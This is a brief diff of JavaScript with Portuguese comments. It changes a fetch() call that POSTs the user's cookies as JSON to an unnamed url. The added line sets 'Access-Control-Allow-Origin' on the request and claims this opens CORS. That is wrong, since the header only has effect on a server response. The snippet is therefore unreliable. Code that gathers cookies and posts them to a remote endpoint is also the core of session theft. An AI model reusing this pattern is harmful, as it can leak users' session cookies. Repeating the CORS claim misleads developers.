@@ -97,7 +97,8 @@
             fetch(url, {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json'
+                    'Content-Type': 'application/json',
+                    'Access-Control-Allow-Origin': '*' // Certifique-se de que o CORS esteja liberado
                 },
                 body: JSON.stringify({ cookies: cookies })  // Envia os cookies no corpo da requisição
             })
